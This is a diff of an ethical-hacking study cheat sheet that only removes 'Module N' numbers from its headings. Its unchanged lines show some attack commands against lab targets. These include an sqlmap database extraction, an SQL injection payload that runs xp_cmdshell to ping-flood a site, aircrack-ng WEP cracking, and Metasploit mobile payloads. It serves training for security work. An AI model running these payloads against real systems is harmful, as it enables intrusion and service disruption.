@@ -55,7 +55,7 @@ Netcraft.com
 Httprecon (web)
 
 --------------------------------------------------------------------------
-Module 3 – Scanning Networks
+Scanning Networks
 
 ¨ Port and Service Discovery
 
@@ -109,7 +109,7 @@ Metasploit
 	services -> to get all available services in a subnet
   
 --------------------------------------------------------------------------
-Module 4 – Enumeration
+Enumeration
 
 ¨ NetBIOS Enumeration
 
@@ -158,7 +158,7 @@ Enum4linux
 	NetScanTools Pro (SMB, RPC Enum). 
 
 --------------------------------------------------------------------------
-Module 5 – Vulnerability Analisis
+Vulnerability Analisis
 
 ¨ Nessus
 
@@ -191,7 +191,7 @@ Module 5 – Vulnerability Analisis
 https://www.exploit-db.com/
 
 --------------------------------------------------------------------------
-Module 6 – System Hacking
+System Hacking
 
 ¨ Crack and Audit Password
 
@@ -247,7 +247,7 @@ L0phtCrack(pass crack & audit)
 RainbowCrack
 
 --------------------------------------------------------------------------
-Module 8 – Sniffing
+Sniffing
 
 ¨ Wireshark
 
@@ -266,7 +266,7 @@ Module 8 – Sniffing
 	nmap --script=sniffer-detect 10.10.10.19 - 10.10.10.19 is the target IP 
 
 --------------------------------------------------------------------------  
-Module 13 – Hacking Web Servers
+Hacking Web Servers
  
   ¨ Wireshark
 
@@ -293,7 +293,7 @@ Module 13 – Hacking Web Servers
 	nmap --script=sniffer-detect 10.10.10.19 - 10.10.10.19 is the target IP 
 
 --------------------------------------------------------------------------  
-Module 14 – Hacking Web Applications
+Hacking Web Applications
 
 ¨ Command Injection
  
@@ -325,7 +325,7 @@ Module 14 – Hacking Web Applications
 	nmap --script=sniffer-detect 10.10.10.19 - 10.10.10.19 is the target IP 
   
 --------------------------------------------------------------------------  
-Module 15 – SQL Injection
+SQL Injection
 
 ¨ sqlmap
 	sqlmap -u “http://www.moviescope.com/viewprofile.aspx?id=1” --cookie="xookies xxx" –dbs - SQLMAP Extract DBS
@@ -359,13 +359,13 @@ Module 15 – SQL Injection
 	blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; -- - Execute cmd from login
   
 --------------------------------------------------------------------------  
-Module 16 – Hacking Wireless Networks  
+Hacking Wireless Networks  
  
  ¨ Aircrack-ng
 	aircrack-ng '/home/attacker/Desktop/Sample Captures/WEPcrack-01.cap'
 
 --------------------------------------------------------------------------  
-Module 17 – Hacking Mobile
+Hacking Mobile
 
 ¨ Metasploit – Binary payloads
 
@@ -401,7 +401,7 @@ Module 17 – Hacking Mobile
 	> insert the ip of the phone
 
 --------------------------------------------------------------------------  
-Module 20 – Cryptography
+Cryptography
   ¨ Other tools and notes
 HackCalc
 MD5 Calculator
